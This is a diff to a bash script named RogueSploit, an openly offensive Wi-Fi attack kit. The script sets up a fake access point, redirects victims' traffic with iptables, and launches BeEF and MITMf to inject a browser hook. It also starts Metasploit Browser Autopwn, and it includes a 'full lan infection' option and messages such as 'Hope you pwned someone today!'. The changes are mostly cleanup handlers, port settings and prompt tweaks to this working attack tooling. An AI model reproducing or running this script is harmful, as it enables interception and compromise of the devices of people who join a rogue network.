@@ -28,7 +28,24 @@ red='\e[1;31m'
 yellow='\e[1;33m'
 blue='\e[1;34m'
 
-
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"--<[!] (Ctrl + C ) Detected, Trying To Exit... [!]>--"
+sleep 1
+service hostapd stop
+service network-manager restart
+pkill dns*
+pkill hostapd
+pkill dhcpd
+pkill airmon-ng
+pkill airbase-ng
+echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
+sleep 1
+echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
+echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
+exit
+}
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
@@ -46,27 +63,6 @@ pkill airbase-ng
 iptables -F
 airmon-ng stop wlan1mon
 sleep 3
-
-###################################################
-# CTRL C
-###################################################
-trap ctrl_c SIGINT
-ctrl_c() {
-clear
-echo -e $red"--<[!] (Ctrl + C ) Detected, Trying To Exit... [!]>--"
-sleep 1
-echo ""
-pkill dhcpd
-pkill airmon-ng
-pkill airbase-ng
-airmon-ng stop wlan1mon
-ifconfig at0 down
-echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
-sleep 1
-echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
-echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
-exit
-}
 
 LOG_FILE=$PWD/roguesploit.log
 exec > >(tee -a ${LOG_FILE} )
@@ -111,7 +107,7 @@ relase_rules () {
 	iptables -t mangle -F
 	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
 	iptables -A FORWARD -i wlan1 -j ACCEPT
-	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+	#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 <-- enable this if you want to give internet to the interface
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf wlan1
 }
@@ -414,7 +410,7 @@ EOF
 		#
 
 		tcp      = Off        # Use the TCP DNS proxy instead of the default UDP (not fully tested, might break stuff!)
-		port     = 53         # Port to listen on
+		port     = 54         # Port to listen on
 		ipv6     = Off        # Run in IPv6 mode (not fully tested, might break stuff!)
 
 		#
@@ -496,7 +492,7 @@ EOF
 
 	#Servers to start
 	SQL   = On
-	HTTPS = On
+	HTTPS = Off
 	Kerberos = On
 	FTP  = On
 	POP  = On
@@ -624,7 +620,7 @@ EOF
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
 	
-	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
+	msfport = 8082    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
@@ -926,11 +922,12 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #add "--browsersniper" if you want to enable automatic pwning of injected browsers;
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh"& xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" #sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #enable this instead of starting msf captive portal, but you'll need an internet connection and enable line 114. Add "--browsersniper" if you want to enable automatic pwning of injected browsers;
 #but you need to change some other option to enable correctly the metasploit method too;
 # Line 370: "auto_msfrpcd: false" to "auto_msfrpcd: true"
 # Line 319: "enable: false" to "enable: true"
-# Line 927: change seconds to 30 or more for stability and good timing (Ex.  .. sleep 20 .. to .. sleep 30 ..) 
+# Line 929: change seconds to 30 or more for stability and good timing (Ex.  .. sleep 20 .. to .. sleep 30 ..)
+# if you enable this method, please comment this " term -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" " or you'll have problems :D
 	menu
 }
 
@@ -959,7 +956,10 @@ if test $answer1 == '1'
 	pkill airmon-ng
 	pkill dhcpd
 	pkill hostapd
-	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";tput sgr0
+	pkill dns*
+	pkill tor
+	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]\n";
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": ";tput sgr0
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -973,7 +973,7 @@ driver=nl80211
 ssid=$nameap
 channel=6 "> $PWD/hostapd.conf
 	pkill hostapd
-	rogueon && xterm -title "BeEF" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
+	rogueon && xterm -title "Fake AP" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
 	service network-manager start
 	menu
 elif test $answer1 == '2'
@@ -983,7 +983,7 @@ elif test $answer1 == '2'
 	echo -e $yellow" 1. Browser Autopwn 1"
 	echo -e $blue" 2. Browser Autopwn 2"
 	echo -e $white" 3. BeEF + MITMF full lan infection"
-	echo -ne $red"$myname@pwningservices: ";tput sgr0
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": "tput sgr0
 	read choice
 	if test $choice == '1'
 		then
@@ -1011,6 +1011,10 @@ elif test $answer1 == '2'
 			then
 			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
 			pkill dhcpd
+			pkill hostapd
+			service hostapd stop
+			service network-manager restart
+			pkill dns*
 			pkill airmon-ng
 			pkill airbase-ng
 			sleep 1
@@ -1165,7 +1169,9 @@ if test $answer1 == '1'
 	pkill airmon-ng
 	pkill dhcpd
 	pkill hostapd
-	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";tput sgr0
+	pkill dns*
+	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": ";tput sgr0
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -1189,7 +1195,7 @@ elif test $answer1 == '2'
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
 	echo -e $white" 3. BeEF + MITMF full lan infection"
-	echo -ne $red"$myname@pwningservices: ";tput sgr0
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": "tput sgr0
 	read choice
 	if test $choice == '1'
 		then
@@ -1217,6 +1223,10 @@ elif test $answer1 == '2'
 			then
 			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
 			pkill dhcpd
+			pkill hostapd
+			service hostapd stop
+			service network-manager restart
+			pkill dns*
 			pkill airmon-ng
 			pkill airbase-ng
 			sleep 1
